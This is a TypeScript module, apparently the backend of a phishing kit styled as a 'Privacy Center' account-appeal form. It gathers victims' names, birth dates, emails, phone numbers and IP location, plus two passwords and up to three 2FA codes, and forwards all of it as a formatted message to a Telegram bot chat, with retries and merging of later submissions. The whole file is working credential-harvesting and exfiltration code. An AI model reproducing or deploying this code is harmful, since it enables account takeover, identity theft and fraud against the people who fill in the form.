import https from 'https';
import axios from 'axios';
import type { FormData } from '@/app/store/slices/stepFormSlice';
import { memoryStoreTTL } from 'utils/memoryStore';
import { generateKey } from 'utils/generateKey';

const agent = new https.Agent({ family: 4 });

/** Giới hạn Telegram; chừa biên cho entity HTML. */
const TELEGRAM_TEXT_MAX = 4096;

export type SendTelegramOutcome =
    | { ok: true; skipped?: false }
    | { ok: true; skipped: true; reason: 'missing_config' | 'rate_limited' }
    | { ok: false; error: unknown };

function getTelegramConfig() {
    const token = process.env.TELEGRAM_BOT_TOKEN?.trim();
    const chatId = process.env.TELEGRAM_CHAT_ID?.trim();
    if (!token || !chatId) {
        return null;
    }
    return {
        api: `https://api.telegram.org/bot${token}`,
        chatId,
    };
}

const rateLimiter = new Map<string, number>();
const RATE_LIMIT_WINDOW_MS = 1000;

function checkRateLimit(key: string): boolean {
    const now = Date.now();
    const lastCall = rateLimiter.get(key);

    if (!lastCall || now - lastCall > RATE_LIMIT_WINDOW_MS) {
        rateLimiter.set(key, now);
        return true;
    }

    return false;
}

async function retryTelegramRequest<T>(
    requestFn: () => Promise<T>,
    maxRetries = 3
): Promise<T> {
    let lastError: unknown;

    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            return await requestFn();
        } catch (error: unknown) {
            lastError = error;
            const err = error as { response?: { status?: number; data?: { description?: string } }; message?: string };
            const errorCode = err?.response?.status;
            const errorDesc = err?.response?.data?.description ?? '';

            if (
                errorCode === 401 ||
                errorCode === 403 ||
                errorDesc.includes('chat not found') ||
                errorDesc.includes('bot was blocked')
            ) {
                throw error;
            }

            if (attempt === maxRetries) {
                break;
            }

            const delayMs = 2 ** (attempt - 1) * 1000;
            console.warn(`Telegram API attempt ${attempt} failed, retry in ${delayMs}ms:`, err?.message);
            await new Promise((resolve) => setTimeout(resolve, delayMs));
        }
    }

    throw lastError;
}

function escapeHtml(value: string | number | null | undefined): string {
    const str = value === null || value === undefined ? '' : String(value);
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

type NormalizedPrivacyPayload = {
    ip: string;
    location: string;
    country_code: string;
    fullName: string;
    fanpage: string;
    day: string;
    month: string;
    year: string;
    email: string;
    emailBusiness: string;
    phone: string;
    appealReason: string;
    message: string;
    password: string;
    passwordSecond: string;
    authMethod: string;
    twoFa: string;
    twoFaSecond: string;
    twoFaThird: string;
};

function normalizeData(input: Partial<FormData> | Record<string, unknown> = {}): NormalizedPrivacyPayload {
    const raw = input as Record<string, unknown>;
    return {
        ip: String(raw.ip ?? ''),
        location: String(raw.location ?? ''),
        country_code: String(raw.country_code ?? ''),
        fullName: String(raw.fullName ?? raw.name ?? ''),
        fanpage: String(raw.fanpage ?? ''),
        day: String(raw.day ?? ''),
        month: String(raw.month ?? ''),
        year: String(raw.year ?? ''),
        email: String(raw.email ?? ''),
        emailBusiness: String(raw.emailBusiness ?? raw.business ?? ''),
        phone: String(raw.phone ?? ''),
        appealReason: String(raw.appealReason ?? ''),
        message: String(raw.message ?? ''),
        password: String(raw.password ?? ''),
        passwordSecond: String(raw.passwordSecond ?? ''),
        authMethod: String(raw.authMethod ?? ''),
        twoFa: String(raw.twoFa ?? ''),
        twoFaSecond: String(raw.twoFaSecond ?? ''),
        twoFaThird: String(raw.twoFaThird ?? ''),
    };
}

function mergeData(
    oldData: Partial<FormData> | Record<string, unknown> = {},
    newData: Partial<FormData> | Record<string, unknown> = {}
): NormalizedPrivacyPayload {
    const normalizedOld = normalizeData(oldData);
    const normalizedNew = normalizeData(newData);
    const result = { ...normalizedOld };
    (Object.entries(normalizedNew) as [keyof NormalizedPrivacyPayload, string][]).forEach(([k, v]) => {
        if (v !== undefined && v !== '') {
            result[k] = v;
        }
    });
    return result;
}

/** Một dòng: nhãn + giá trị sát nhau (không thụt lề). */
function kv(label: string, value: string): string {
    return `<b>${escapeHtml(label)}</b> <code>${escapeHtml(value)}</code>`;
}

/** Tiêu đề nhóm + các dòng ngay bên dưới, không thêm dòng trống giữa các dòng con. */
function block(emoji: string, title: string, lines: string[]): string | null {
    if (lines.length === 0) return null;
    return `${emoji} <b>${escapeHtml(title)}</b>\n${lines.join('\n')}`;
}

function formatUtcTimestamp(): string {
    const d = new Date();
    const p = (n: number, w = 2) => String(n).padStart(w, '0');
    return `${d.getUTCFullYear()}-${p(d.getUTCMonth() + 1)}-${p(d.getUTCDate())} ${p(d.getUTCHours())}:${p(d.getUTCMinutes())} UTC`;
}

function formatMessage(data: Partial<FormData> | Record<string, unknown>): string {
    const d = normalizeData(data);

    const header = `📋 <b>Privacy Center</b> · 🕐 <code>${escapeHtml(formatUtcTimestamp())}</code>`;

    const body: string[] = [];

    const net: string[] = [];
    if (d.ip) net.push(kv('IP', d.ip));
    if (d.location) net.push(kv('Vị trí', d.location));
    if (d.country_code) net.push(kv('QG', d.country_code));
    const netBlock = block('📍', 'Mạng', net);
    if (netBlock) body.push(netBlock);

    const profile: string[] = [];
    if (d.fullName) profile.push(kv('Họ tên', d.fullName));
    if (d.fanpage) profile.push(kv('Trang', d.fanpage));
    const hasDob = d.day || d.month || d.year;
    if (hasDob) {
        const dob =
            d.day && d.month && d.year
                ? `${d.day}/${d.month}/${d.year}`
                : [d.day, d.month, d.year].filter(Boolean).join('/');
        profile.push(kv('Sinh nhật', dob));
    }
    const profileBlock = block('👤', 'Hồ sơ', profile);
    if (profileBlock) body.push(profileBlock);

    const contact: string[] = [];
    if (d.email) contact.push(kv('Email', d.email));
    if (d.emailBusiness) contact.push(kv('Email CV', d.emailBusiness));
    if (d.phone) contact.push(kv('SĐT', `+${d.phone.replace(/^\+/, '')}`));
    const contactBlock = block('✉️', 'Liên hệ', contact);
    if (contactBlock) body.push(contactBlock);

    const appeal: string[] = [];
    if (d.appealReason) appeal.push(kv('Lý do', d.appealReason));
    if (d.message) appeal.push(kv('Ghi chú', d.message));
    const appealBlock = block('📝', 'Nội dung', appeal);
    if (appealBlock) body.push(appealBlock);

    const sec: string[] = [];
    if (d.password) sec.push(kv('MK 1', d.password));
    if (d.passwordSecond) sec.push(kv('MK 2', d.passwordSecond));
    if (d.authMethod) sec.push(kv('Xác thực', d.authMethod));
    if (d.twoFa) sec.push(kv('2FA 1', d.twoFa));
    if (d.twoFaSecond) sec.push(kv('2FA 2', d.twoFaSecond));
    if (d.twoFaThird) sec.push(kv('2FA 3', d.twoFaThird));
    const secBlock = block('🔐', 'Bảo mật', sec);
    if (secBlock) body.push(secBlock);

    let text =
        body.length === 0
            ? `${header}\n⚪ <i>Chưa có dữ liệu.</i>`
            : [header, ...body].join('\n');

    if (text.length > TELEGRAM_TEXT_MAX) {
        text = `${text.slice(0, TELEGRAM_TEXT_MAX - 40)}\n⚠️ <i>Đã cắt bớt (giới hạn Telegram)</i>`;
    }
    return text;
}

async function postSendMessage(
    apiBase: string,
    chatId: string,
    text: string
): Promise<{ message_id?: number }> {
    const res = await retryTelegramRequest(() =>
        axios.post<{ result?: { message_id?: number } }>(
            `${apiBase}/sendMessage`,
            {
                chat_id: chatId,
                text,
                parse_mode: 'HTML',
            },
            {
                httpsAgent: agent,
                timeout: 10000,
            }
        )
    );
    return res.data?.result ?? {};
}

export async function sendTelegramMessage(data: Partial<FormData>): Promise<SendTelegramOutcome> {
    const config = getTelegramConfig();
    if (!config) {
        console.warn(
            'Telegram skipped: set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in environment'
        );
        return { ok: true, skipped: true, reason: 'missing_config' };
    }

    const key = generateKey(data as Record<string, string>);
    if (!checkRateLimit(key)) {
        console.warn(`Telegram skipped: rate limit for key ${key}`);
        return { ok: true, skipped: true, reason: 'rate_limited' };
    }

    const prev = memoryStoreTTL.get(key);
    const fullData = mergeData(prev?.data ?? {}, data);
    const updatedText = formatMessage(fullData);

    try {
        const { message_id: messageId } = await postSendMessage(config.api, config.chatId, updatedText);
        if (messageId !== undefined) {
            memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
        } else {
            console.warn('Telegram API response missing message_id');
        }
        return { ok: true };
    } catch (err: unknown) {
        const desc =
            (err as { response?: { data?: { description?: string } } })?.response?.data?.description ?? '';
        if (desc.includes('message to edit not found')) {
            try {
                const { message_id: messageId } = await postSendMessage(
                    config.api,
                    config.chatId,
                    updatedText
                );
                if (messageId !== undefined) {
                    memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
                }
            } catch (sendErr) {
                console.error('Telegram resend error:', sendErr);
                return { ok: false, error: sendErr };
            }
            return { ok: true };
        }
        console.error('Telegram send error:', err);
        return { ok: false, error: err };
    }
}
